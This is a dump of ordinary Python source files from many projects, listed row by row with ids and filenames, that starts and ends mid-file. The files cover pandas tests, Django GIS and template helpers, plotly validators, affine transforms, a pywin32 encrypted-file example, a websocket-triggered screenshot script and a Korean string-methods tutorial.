# limitations under the License.
from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory
from voltha.extensions.alarms.adapter_alarms import AlarmBase


class OnuSelfTestFailureAlarm(AlarmBase):
    """"""
    The ONU Self Test Failure Alarm is reported by both the CircuitPack (ME #6)
    and the ONT-G (ME # 256) to indicate failure a failed autonomous self-test.

    For CircuitPack equipment alarms, the intf_id reported is that of the
    UNI's logical port number

    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI
    physical port number

    Note: Some ONUs may use this alarm to report a self-test failure or may
          may report it with the ONU Equipment Alarm which can also cover a
          self-test failure.
    """"""
    def __init__(self, alarm_mgr, onu_id, intf_id):
        super(OnuSelfTestFailureAlarm, self).__init__(alarm_mgr, object_type='onu self-test failure',
                                                      alarm='ONU_SELF_TEST_FAIL',
                                                      alarm_category=AlarmEventCategory.ONU,
                                                      alarm_type=AlarmEventType.EQUIPTMENT,
                                                      alarm_severity=AlarmEventSeverity.CRITICAL)
        self._onu_id = onu_id
        self._intf_id = intf_id

    def get_context_data(self):
        return {'onu-id': self._onu_id,
                'onu-intf-id': self._intf_id}"
JY381	JY381-transform.py	"'''functions for 2D affine transformations'''
__all__ = (
    'nullTransform',
    'translate',
    'scale',
    'rotate',
    'skewX',
    'skewY',
    'mmult',
    'inverse',
    'zTransformPoint',
    'transformPoint',
    'transformPoints',
    'zTransformPoints',
    )
from math import pi, cos, sin, tan

# constructors for matrices:
def nullTransform():
    return (1, 0, 0, 1, 0, 0)

def translate(dx, dy):
    return (1, 0, 0, 1, dx, dy)

def scale(sx, sy):
    return (sx, 0, 0, sy, 0, 0)

def rotate(angle):
    a = angle * pi/180
    return (cos(a), sin(a), -sin(a), cos(a), 0, 0)

def skewX(angle):
    a = angle * pi/180
    return (1, 0, tan(a), 1, 0, 0)

def skewY(angle):
    a = angle * pi/180
    return (1, tan(a), 0, 1, 0, 0)

def mmult(A, B):
    ""A postmultiplied by B""
    # I checked this RGB
    # [a0 a2 a4]    [b0 b2 b4]
    # [a1 a3 a5] *  [b1 b3 b5]
    # [      1 ]    [      1 ]
    #
    return (A[0]*B[0] + A[2]*B[1],
            A[1]*B[0] + A[3]*B[1],
            A[0]*B[2] + A[2]*B[3],
            A[1]*B[2] + A[3]*B[3],
            A[0]*B[4] + A[2]*B[5] + A[4],
            A[1]*B[4] + A[3]*B[5] + A[5])

def inverse(A):
    ""For A affine 2D represented as 6vec return 6vec version of A**(-1)""
    # I checked this RGB
    det = float(A[0]*A[3] - A[2]*A[1])
    R = [A[3]/det, -A[1]/det, -A[2]/det, A[0]/det]
    return tuple(R+[-R[0]*A[4]-R[2]*A[5],-R[1]*A[4]-R[3]*A[5]])

def zTransformPoint(A,v):
    ""Apply the homogenous part of atransformation a to vector v --> A*v""
    return (A[0]*v[0]+A[2]*v[1],A[1]*v[0]+A[3]*v[1])

def transformPoint(A,v):
    ""Apply transformation a to vector v --> A*v""
    return (A[0]*v[0]+A[2]*v[1]+A[4],A[1]*v[0]+A[3]*v[1]+A[5])

def transformPoints(matrix, V):
    r = [transformPoint(matrix,v) for v in V]
    if isinstance(V,tuple): r = tuple(r)
    return r

def zTransformPoints(matrix, V):
    return list(map(lambda x,matrix=matrix: zTransformPoint(matrix,x), V))"
JY83	JY83-ogrinfo.py	"""""""
This module includes some utility functions for inspecting the layout
of a GDAL data source -- the functionality is analogous to the output
produced by the `ogrinfo` utility.
""""""

from django.contrib.gis.gdal import DataSource
from django.contrib.gis.gdal.geometries import GEO_CLASSES


def ogrinfo(data_source, num_features=10):
    """"""
    Walk the available layers in the supplied `data_source`, displaying
    the fields for the first `num_features` features.
    """"""

    # Checking the parameters.
    if isinstance(data_source, str):
        data_source = DataSource(data_source)
    elif isinstance(data_source, DataSource):
        pass
    else:
        raise Exception('Data source parameter must be a string or a DataSource object.')

    for i, layer in enumerate(data_source):
        print(""data source : %s"" % data_source.name)
        print(""==== layer %s"" % i)
        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)
        print(""  # features: %s"" % len(layer))
        print(""         srs: %s"" % layer.srs)
        extent_tup = layer.extent.tuple
        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))
        print(""Displaying the first %s features ===="" % num_features)

        width = max(*map(len, layer.fields))
        fmt = "" %%%ss: %%s"" % width
        for j, feature in enumerate(layer[:num_features]):
            print(""=== Feature %s"" % j)
            for fld_name in layer.fields:
                type_name = feature[fld_name].type_name
                output = fmt % (fld_name, type_name)
                val = feature.get(fld_name)
                if val:
                    if isinstance(val, str):
                        val_fmt = ' (""%s"")'
                    else:
                        val_fmt = ' (%s)'
                    output += val_fmt % val
                else:
                    output += ' (None)'
                print(output)"
JD235	JD235-test_head_tail.py	"import numpy as np

from pandas import DataFrame
import pandas._testing as tm


def test_head_tail_generic(index, frame_or_series):
    # GH#5370

    ndim = 2 if frame_or_series is DataFrame else 1
    shape = (len(index),) * ndim
    vals = np.random.randn(*shape)
    obj = frame_or_series(vals, index=index)

    tm.assert_equal(obj.head(), obj.iloc[:5])
    tm.assert_equal(obj.tail(), obj.iloc[-5:])

    # 0-len
    tm.assert_equal(obj.head(0), obj.iloc[0:0])
    tm.assert_equal(obj.tail(0), obj.iloc[0:0])

    # bounded
    tm.assert_equal(obj.head(len(obj) + 1), obj)
    tm.assert_equal(obj.tail(len(obj) + 1), obj)

    # neg index
    tm.assert_equal(obj.head(-3), obj.head(len(index) - 3))
    tm.assert_equal(obj.tail(-3), obj.tail(len(index) - 3))


def test_head_tail(float_frame):
    tm.assert_frame_equal(float_frame.head(), float_frame[:5])
    tm.assert_frame_equal(float_frame.tail(), float_frame[-5:])

    tm.assert_frame_equal(float_frame.head(0), float_frame[0:0])
    tm.assert_frame_equal(float_frame.tail(0), float_frame[0:0])

    tm.assert_frame_equal(float_frame.head(-1), float_frame[:-1])
    tm.assert_frame_equal(float_frame.tail(-1), float_frame[1:])
    tm.assert_frame_equal(float_frame.head(1), float_frame[:1])
    tm.assert_frame_equal(float_frame.tail(1), float_frame[-1:])
    # with a float index
    df = float_frame.copy()
    df.index = np.arange(len(float_frame)) + 0.1
    tm.assert_frame_equal(df.head(), df.iloc[:5])
    tm.assert_frame_equal(df.tail(), df.iloc[-5:])
    tm.assert_frame_equal(df.head(0), df[0:0])
    tm.assert_frame_equal(df.tail(0), df[0:0])
    tm.assert_frame_equal(df.head(-1), df.iloc[:-1])
    tm.assert_frame_equal(df.tail(-1), df.iloc[1:])


def test_head_tail_empty():
    # test empty dataframe
    empty_df = DataFrame()
    tm.assert_frame_equal(empty_df.tail(), empty_df)
    tm.assert_frame_equal(empty_df.head(), empty_df)"
JY131	JY131-conemu.py	"from cx_Oracle import CLOB

from django.contrib.gis.db.backends.base.adapter import WKTAdapter
from django.contrib.gis.geos import GeometryCollection, Polygon


class OracleSpatialAdapter(WKTAdapter):
    input_size = CLOB

    def __init__(self, geom):
        """"""
        Oracle requires that polygon rings are in proper orientation. This
        affects spatial operations and an invalid orientation may cause
        failures. Correct orientations are:
         * Outer ring - counter clockwise
         * Inner ring(s) - clockwise
        """"""
        if isinstance(geom, Polygon):
            if self._polygon_must_be_fixed(geom):
                geom = self._fix_polygon(geom)
        elif isinstance(geom, GeometryCollection):
            if any(
                isinstance(g, Polygon) and self._polygon_must_be_fixed(g) for g in geom
            ):
                geom = self._fix_geometry_collection(geom)

        self.wkt = geom.wkt
        self.srid = geom.srid

    @staticmethod
    def _polygon_must_be_fixed(poly):
        return not poly.empty and (
            not poly.exterior_ring.is_counterclockwise
            or any(x.is_counterclockwise for x in poly)
        )

    @classmethod
    def _fix_polygon(cls, poly, clone=True):
        """"""Fix single polygon orientation as described in __init__().""""""
        if clone:
            poly = poly.clone()

        if not poly.exterior_ring.is_counterclockwise:
            poly.exterior_ring = list(reversed(poly.exterior_ring))

        for i in range(1, len(poly)):
            if poly[i].is_counterclockwise:
                poly[i] = list(reversed(poly[i]))

        return poly

    @classmethod
    def _fix_geometry_collection(cls, coll):
        """"""
        Fix polygon orientations in geometry collections as described in
        __init__().
        """"""
        coll = coll.clone()
        for i, geom in enumerate(coll):
            if isinstance(geom, Polygon):
                coll[i] = cls._fix_polygon(geom, clone=False)
        return coll"
JY10	JY10-TESTS.py	"#!../env.py
# SPDX-License-Identifier: BSD-3-Clause
# Copyright 2020, Intel Corporation
#

import testframework as t


class Pmem2Memmove(t.Test):
    test_type = t.Short
    filesize = 4 * t.MiB
    envs0 = ()
    envs1 = ()
    test_cases = [
        # No offset, no overlap
        ['b:4096'],

        # aligned dest, unaligned source, no overlap
        ['s:7', 'b:4096'],

        # unaligned dest, unaligned source, no overlap
        ['d:7', 's:13', 'b:4096'],

        # all aligned, src overlaps dest
        ['b:4096', 's:23', 'o:1'],

        # unaligned destination
        ['b:4096', 'd:21'],

        # unaligned source and dest
        ['b:4096', 'd:21', 's:7'],

        # overlap of src, aligned src and dest
        ['b:4096', 'o:1', 's:20'],

        # overlap of src, aligned src, unaligned dest
        ['b:4096', 'd:13', 'o:1', 's:20'],

        # dest overlaps src, unaligned dest, aligned src
        ['b:2048', 'd:33', 'o:1'],

        # dest overlaps src, aligned dest and src
        ['b:4096', 'o:1', 'd:20'],

        # aligned dest, no overlap, small length
        ['b:8'],

        # small length, offset 1 byte from 64 byte boundary
        ['b:4', 'd:63'],

        # overlap, src < dest, small length (ensures a copy backwards,
        # with number of bytes to align < length)
        ['o:1', 'd:2', 'b:8']
    ]

    def run(self, ctx):
        for env in self.envs0:
            ctx.env[env] = '0'
        for env in self.envs1:
            ctx.env[env] = '1'
        for tc in self.test_cases:
            filepath = ctx.create_holey_file(self.filesize, 'testfile',)
            ctx.exec('pmem2_memmove', filepath, *tc)


class TEST0(Pmem2Memmove):
    pass


@t.require_architectures('x86_64')
class TEST1(Pmem2Memmove):
    envs0 = (""PMEM_AVX512F"",)


@t.require_architectures('x86_64')
class TEST2(Pmem2Memmove):
    envs0 = (""PMEM_AVX512F"", ""PMEM_AVX"",)


class TEST3(Pmem2Memmove):
    envs1 = (""PMEM_NO_MOVNT"",)


class TEST4(Pmem2Memmove):
    envs1 = (""PMEM_NO_MOVNT"", ""PMEM_NO_GENERIC_MEMCPY"")"
JY215	JY215-OpenEncryptedFileRaw.py	"import win32file, win32api, winerror
import os


def ReadCallback(input_buffer, data, buflen):
    fnamein, fnameout, f = data
    ## print fnamein, fnameout, buflen
    f.write(input_buffer)
    ## python 2.3 throws an error if return value is a plain int
    return winerror.ERROR_SUCCESS


def WriteCallback(output_buffer, data, buflen):
    fnamebackup, fnameout, f = data
    file_data = f.read(buflen)
    ## returning 0 as len terminates WriteEncryptedFileRaw
    output_len = len(file_data)
    output_buffer[:output_len] = file_data
    return winerror.ERROR_SUCCESS, output_len


tmp_dir = win32api.GetTempPath()
dst_dir = win32api.GetTempFileName(tmp_dir, ""oef"")[0]
os.remove(dst_dir)
os.mkdir(dst_dir)
print(""Destination dir:"", dst_dir)

## create an encrypted file
fname = win32api.GetTempFileName(dst_dir, ""ref"")[0]
print(""orig file:"", fname)
f = open(fname, ""w"")
f.write(""xxxxxxxxxxxxxxxx\n"" * 32768)
f.close()
## add a couple of extra data streams
f = open(fname + "":stream_y"", ""w"")
f.write(""yyyyyyyyyyyyyyyy\n"" * 32768)
f.close()
f = open(fname + "":stream_z"", ""w"")
f.write(""zzzzzzzzzzzzzzzz\n"" * 32768)
f.close()
win32file.EncryptFile(fname)

## backup raw data of encrypted file
bkup_fname = win32api.GetTempFileName(dst_dir, ""bef"")[0]
print(""backup file:"", bkup_fname)
f = open(bkup_fname, ""wb"")
ctxt = win32file.OpenEncryptedFileRaw(fname, 0)
try:
    win32file.ReadEncryptedFileRaw(ReadCallback, (fname, bkup_fname, f), ctxt)
finally:
    ## if context is not closed, file remains locked even if calling process is killed
    win32file.CloseEncryptedFileRaw(ctxt)
    f.close()

## restore data from backup to new encrypted file
dst_fname = win32api.GetTempFileName(dst_dir, ""wef"")[0]
print(""restored file:"", dst_fname)
f = open(bkup_fname, ""rb"")
ctxtout = win32file.OpenEncryptedFileRaw(dst_fname, win32file.CREATE_FOR_IMPORT)
try:
    win32file.WriteEncryptedFileRaw(WriteCallback, (bkup_fname, dst_fname, f), ctxtout)
finally:
    win32file.CloseEncryptedFileRaw(ctxtout)
    f.close()"
JD378	JD378-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""funnelarea"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD154	JD154-_exception.py	"# pyeXRC - Python Reddit client
# Copyright © 2023 - exhumer

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, version 3 of the License.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

from datetime import datetime, timezone

from httpx import Response

from ._type import OAuth2Token


class OAuth2TokenException(Exception):
    pass


class OAuth2ExpiredTokenException(Exception):
    def __init__(self, token: OAuth2Token, expiry: datetime):
        super().__init__(f""OAuth2 token {token['access_token']} expired at {expiry}!"")


class OAuth2RevokedTokenException(OAuth2TokenException):
    def __init__(self, token: OAuth2Token):
        self.__token = token
        self.__msg = f""Token {token['access_token']} has been revoked!""
        super().__init__(self.__msg)

    @property
    def message(self):
        return self.__msg

    @property
    def token(self):
        return self.__token


class RateLimitException(Exception):
    def __init__(self, reset: datetime):
        self.__reset = reset
        super().__init__(f""Rate limited until {reset.isoformat()}!"")

    @property
    def seconds_until_reset(self):
        if self.__reset > datetime.now(tz=timezone.utc):
            return int((self.__reset - datetime.now(tz=timezone.utc)).total_seconds())

        return 0


class RESTException(Exception):
    def __init__(self, res: Response):
        self.__res = res
        super().__init__(f""REST exception occurred with status code {res.status_code}!\n"" +
                         f""Response: {res.request.read()}"")

    @property
    def response(self):
        return self.__res"
JY148	JY148-_wrap.py	"import re
from typing import Iterable, List, Tuple

from ._loop import loop_last
from .cells import cell_len, chop_cells

re_word = re.compile(r""\s*\S+\s*"")


def words(text: str) -> Iterable[Tuple[int, int, str]]:
    position = 0
    word_match = re_word.match(text, position)
    while word_match is not None:
        start, end = word_match.span()
        word = word_match.group(0)
        yield start, end, word
        word_match = re_word.match(text, end)


def divide_line(text: str, width: int, fold: bool = True) -> List[int]:
    divides: List[int] = []
    append = divides.append
    line_position = 0
    _cell_len = cell_len
    for start, _end, word in words(text):
        word_length = _cell_len(word.rstrip())
        if line_position + word_length > width:
            if word_length > width:
                if fold:
                    chopped_words = chop_cells(word, max_size=width, position=0)
                    for last, line in loop_last(chopped_words):
                        if start:
                            append(start)

                        if last:
                            line_position = _cell_len(line)
                        else:
                            start += len(line)
                else:
                    if start:
                        append(start)
                    line_position = _cell_len(word)
            elif line_position and start:
                append(start)
                line_position = _cell_len(word)
        else:
            line_position += _cell_len(word)
    return divides


if __name__ == ""__main__"":  # pragma: no cover
    from .console import Console

    console = Console(width=10)
    console.print(""12345 abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ 12345"")
    print(chop_cells(""abcdefghijklmnopqrstuvwxyz"", 10, position=2))"
JY391	JY391-core.py	"from functools import partial

from six import string_types

from ..execution import execute, ExecutionResult
from ..language.base import parse, print_ast
from ..language import ast
from ..validation import validate
from .base import GraphQLBackend, GraphQLDocument

# Necessary for static type checking
if False:  # flake8: noqa
    from typing import Any, Optional, Union
    from ..language.ast import Document
    from ..type.schema import GraphQLSchema
    from rx import Observable


def execute_and_validate(
    schema,  # type: GraphQLSchema
    document_ast,  # type: Document
    *args,  # type: Any
    **kwargs  # type: Any
):
    # type: (...) -> Union[ExecutionResult, Observable]
    do_validation = kwargs.get(""validate"", True)
    if do_validation:
        validation_errors = validate(schema, document_ast)
        if validation_errors:
            return ExecutionResult(errors=validation_errors, invalid=True)

    return execute(schema, document_ast, *args, **kwargs)


class GraphQLCoreBackend(GraphQLBackend):
    """"""GraphQLCoreBackend will return a document using the default
    graphql executor""""""

    def __init__(self, executor=None):
        # type: (Optional[Any]) -> None
        self.execute_params = {""executor"": executor}

    def document_from_string(self, schema, document_string):
        # type: (GraphQLSchema, Union[Document, str]) -> GraphQLDocument
        if isinstance(document_string, ast.Document):
            document_ast = document_string
            document_string = print_ast(document_ast)
        else:
            assert isinstance(
                document_string, string_types
            ), ""The query must be a string""
            document_ast = parse(document_string)
        return GraphQLDocument(
            schema=schema,
            document_string=document_string,
            document_ast=document_ast,
            execute=partial(
                execute_and_validate, schema, document_ast, **self.execute_params
            ),
        )"
JD181	JD181-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = ""Y년 n월 j일""
TIME_FORMAT = ""A g:i""
DATETIME_FORMAT = ""Y년 n월 j일 g:i A""
YEAR_MONTH_FORMAT = ""Y년 n월""
MONTH_DAY_FORMAT = ""n월 j일""
SHORT_DATE_FORMAT = ""Y-n-j.""
SHORT_DATETIME_FORMAT = ""Y-n-j H:i""
# FIRST_DAY_OF_WEEK =

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    ""%Y-%m-%d"",  # '2006-10-25'
    ""%m/%d/%Y"",  # '10/25/2006'
    ""%m/%d/%y"",  # '10/25/06'
    # ""%b %d %Y"",  # 'Oct 25 2006'
    # ""%b %d, %Y"",  # 'Oct 25, 2006'
    # ""%d %b %Y"",  # '25 Oct 2006'
    # ""%d %b, %Y"",  #'25 Oct, 2006'
    # ""%B %d %Y"",  # 'October 25 2006'
    # ""%B %d, %Y"",  #'October 25, 2006'
    # ""%d %B %Y"",  # '25 October 2006'
    # ""%d %B, %Y"",  # '25 October, 2006'
    ""%Y년 %m월 %d일"",  # '2006년 10월 25일', with localized suffix.
]
TIME_INPUT_FORMATS = [
    ""%H:%M:%S"",  # '14:30:59'
    ""%H:%M:%S.%f"",  # '14:30:59.000200'
    ""%H:%M"",  # '14:30'
    ""%H시 %M분 %S초"",  # '14시 30분 59초'
    ""%H시 %M분"",  # '14시 30분'
]
DATETIME_INPUT_FORMATS = [
    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'
    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'
    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'
    ""%m/%d/%Y %H:%M:%S"",  # '10/25/2006 14:30:59'
    ""%m/%d/%Y %H:%M:%S.%f"",  # '10/25/2006 14:30:59.000200'
    ""%m/%d/%Y %H:%M"",  # '10/25/2006 14:30'
    ""%m/%d/%y %H:%M:%S"",  # '10/25/06 14:30:59'
    ""%m/%d/%y %H:%M:%S.%f"",  # '10/25/06 14:30:59.000200'
    ""%m/%d/%y %H:%M"",  # '10/25/06 14:30'
    ""%Y년 %m월 %d일 %H시 %M분 %S초"",  # '2006년 10월 25일 14시 30분 59초'
    ""%Y년 %m월 %d일 %H시 %M분"",  # '2006년 10월 25일 14시 30분'
]

DECIMAL_SEPARATOR = "".""
THOUSAND_SEPARATOR = "",""
NUMBER_GROUPING = 3"
JD69	JD69-tp-screenshot.py	"import rel
import websocket
import json
import time
import os

import pyautogui as pagui
import cv2 as cv
import numpy as np

import ssl


screen_wid = 1920
screen_hei = 1200
img_wid = screen_wid
img_hei = int(screen_wid / 3)

y_plus = -5

y, x, h, w = int((screen_hei - img_hei) / 2) + y_plus, 0, img_hei, img_wid
dim = (y, x, y + h, x + w)

# ws_url = ""wss://wss.2enter.art/dvtp/""
ws_url = ""wss://wss.2enter.art/dvtp/""
img_dir = ""./dvtp-screenshots""
img_format = ""jpg""


def parse_msg(message):
    message = json.loads(str(message))
    return message


def take_shot(_id):
    # image = pagui.screenshot()
    # image = cv.cvtColor(np.array(pagui.screenshot()), cv.COLOR_RGB2BGR)
    screenshot_image = pagui.screenshot()
    screenshot_image = cv.cvtColor(np.array(screenshot_image), cv.COLOR_BGR2RGB)

    # pagui.screenshot(f""{img_dir}/{_id}.{img_format}"")
    # time.sleep(2)
    # screenshot_image = cv.imread(f""{img_dir}/{_id}.{img_format}"")

    cropped = np.array(screenshot_image)[y : y + h, x : x + w]

    # resized = cv.resize(cropped, (1500, 844), interpolation=cv.INTER_AREA)

    cv.imwrite(f""{img_dir}/{_id}.{img_format}"", cropped)
    print(f""ScreenShot Taken~ key: {_id}"")


def on_message(ws, message):
    message = parse_msg(message)
    if message[""ws_type""] == ""button"":
        print(message[""_id""])
        take_shot(message[""_id""])
    else:
        print(f""It's a {message['ws_type']} type of msg. Not a button msg"")
        # print(message)


def on_error(ws, error):
    print(error)


def on_close(ws, close_status_code, close_msg):
    print(""### closed ###"")


def on_open(ws):
    print(""Opened connection"")


def ws_connection(ws_url):
    ws = websocket.WebSocketApp(
        ws_url,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    return ws


ws_client = ws_connection(ws_url)

ws_client.run_forever(
    dispatcher=rel,
    reconnect=5,
    sslopt={""cert_reqs"": ssl.CERT_NONE},
)  # Set dispatcher to automatic reconnection, 5 second reconnect delay if connection closed unexpectedly

rel.signal(2, rel.abort)  # Keyboard Interrupt
rel.dispatch()"
JD90	JD90-loader.py	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            'select_template() takes an iterable of template names but got a '
            'string: %r. Use get_template() if you want to load a single '
            'template by name.' % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist(', '.join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
JY472	JY472-__init__.py	"from __future__ import annotations

from typing import TYPE_CHECKING

from pandas.plotting._matplotlib.boxplot import (
    BoxPlot,
    boxplot,
    boxplot_frame,
    boxplot_frame_groupby,
)
from pandas.plotting._matplotlib.converter import (
    deregister,
    register,
)
from pandas.plotting._matplotlib.core import (
    AreaPlot,
    BarhPlot,
    BarPlot,
    HexBinPlot,
    LinePlot,
    PiePlot,
    ScatterPlot,
)
from pandas.plotting._matplotlib.hist import (
    HistPlot,
    KdePlot,
    hist_frame,
    hist_series,
)
from pandas.plotting._matplotlib.misc import (
    andrews_curves,
    autocorrelation_plot,
    bootstrap_plot,
    lag_plot,
    parallel_coordinates,
    radviz,
    scatter_matrix,
)
from pandas.plotting._matplotlib.tools import table

if TYPE_CHECKING:
    from pandas.plotting._matplotlib.core import MPLPlot

PLOT_CLASSES: dict[str, type[MPLPlot]] = {
    ""line"": LinePlot,
    ""bar"": BarPlot,
    ""barh"": BarhPlot,
    ""box"": BoxPlot,
    ""hist"": HistPlot,
    ""kde"": KdePlot,
    ""area"": AreaPlot,
    ""pie"": PiePlot,
    ""scatter"": ScatterPlot,
    ""hexbin"": HexBinPlot,
}


def plot(data, kind, **kwargs):
    # Importing pyplot at the top of the file (before the converters are
    # registered) causes problems in matplotlib 2 (converters seem to not
    # work)
    import matplotlib.pyplot as plt

    if kwargs.pop(""reuse_plot"", False):
        ax = kwargs.get(""ax"")
        if ax is None and len(plt.get_fignums()) > 0:
            with plt.rc_context():
                ax = plt.gca()
            kwargs[""ax""] = getattr(ax, ""left_ax"", ax)
    plot_obj = PLOT_CLASSES[kind](data, **kwargs)
    plot_obj.generate()
    plot_obj.draw()
    return plot_obj.result


__all__ = [
    ""plot"",
    ""hist_series"",
    ""hist_frame"",
    ""boxplot"",
    ""boxplot_frame"",
    ""boxplot_frame_groupby"",
    ""table"",
    ""andrews_curves"",
    ""autocorrelation_plot"",
    ""bootstrap_plot"",
    ""lag_plot"",
    ""parallel_coordinates"",
    ""radviz"",
    ""scatter_matrix"",
    ""register"",
    ""deregister"",
]"
JD385	JD385-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""candlestick.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD491	JD491-문자열메서드.py	"# 230312

# join()
# 문자 결합 메서드

strings = [""안녕하세요"", ""개발자가"", ""꿈인"", ""취준생입니다.""]
print(strings)
print("" "".join(strings))
print(""***"".join(strings))


# format()
# 위치의 값으로 데이터를 지정
# 만약 숫자를 입력하지 않은 경우 처음부터 차례대로 값을 대입
# !x => x의 형태에 따라 타입을 지정 s:문자열 f:실수 a:아스키코드
print(""{0} {1}"".format(""Hello"", ""World!""))
print(""{0!s} {1!a}"".format(""Hello"", ""World!""))
#  target을 지정
print(""이름: {who}, 목표:{goal}"".format(who=""이영재"", goal=""개발자""))

# ljust(width,fillchar),rjust(width,fillchar)
print(""이영재"".ljust(50, ""-""))
print(""project"".rjust(50, ""*""))

# 문자열 언팩킹 **함수로 전달하기에 적한한 키-값 딕셔너리가 생성(feat locals()-> 해당 지역변수를 딕션어리화 해주는)
name = ""이영재""
goal = ""개발자""
print(""{name}, {goal}"".format(**locals()))


# split()
print(""이영재입니다.\n취업하고 싶어요\nㅠㅠ"".splitlines())
print(""이영재입니다.+취업하고 싶어요+ㅠㅠ"".split(""+""))
print(""이영재입니다.+취업하고 싶어요+ㅠㅠ"".split(""+"", 1))
print(""이영재입니다.+취업하고 싶어요+ㅠㅠ"".rsplit(""+"", 1))

# strip() -> lstrip(),rstrip()
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".strip(""|||""))
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".lstrip(""|||""))
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".rstrip(""|||""))

# index() ,find()
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".find(""|||""))
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".index(""|||""))
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".find(""***""))
# print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".index(""***""))

# count()
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".count(""|||""))
print(""|||이영재입니다. ||| 취업하고 ||| 싶어요ㅠㅠ|||"".count(""|||"", 0, 20))"
JD384	JD384-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
